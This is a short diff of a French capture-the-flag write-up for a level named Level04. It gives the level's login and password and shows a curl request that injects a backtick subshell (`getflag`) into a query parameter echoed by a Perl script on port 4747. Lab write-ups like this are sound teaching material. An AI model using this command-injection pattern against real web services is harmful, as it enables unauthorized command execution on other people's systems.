@@ -1,4 +1,4 @@
-# Level04
+# Level04: Injection subshell script perl
 
 > login:password -> *`level04:qi0maab88jeaj46qoumi7maus`*
 ```
@@ -38,7 +38,7 @@ Le script affiche la valeur du parametre "x" sur le port `:4747`.
 On peut donc injecter un subshell pour que son echo affiche le resultat
 
 ```
-:~$ curl localhost:4747?x=toto
+:~$ curl 'localhost:4747?x=toto'
 toto
 
 :~$ curl 'localhost:4747?x=`getflag`'
